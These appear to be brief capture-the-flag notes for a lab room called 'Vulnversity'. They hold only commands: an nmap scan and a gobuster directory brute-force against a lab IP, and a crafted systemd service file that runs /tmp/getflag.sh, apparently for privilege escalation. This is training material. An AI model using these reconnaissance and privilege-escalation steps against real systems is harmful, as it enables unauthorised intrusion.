# VULNVERSITY

```
export IP=10.10.100.203
```

```
nmap -A -p- -oN nmap.out $IP -vv
```

```
gobuster dir -u http://$IP:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster.out 
```

echo "[Unit]
Description=Example systemd service.

[Service]
Type=simple
ExecStart=/bin/bash /tmp/getflag.sh

[Install]
WantedBy=multi-user.target" > 1313.service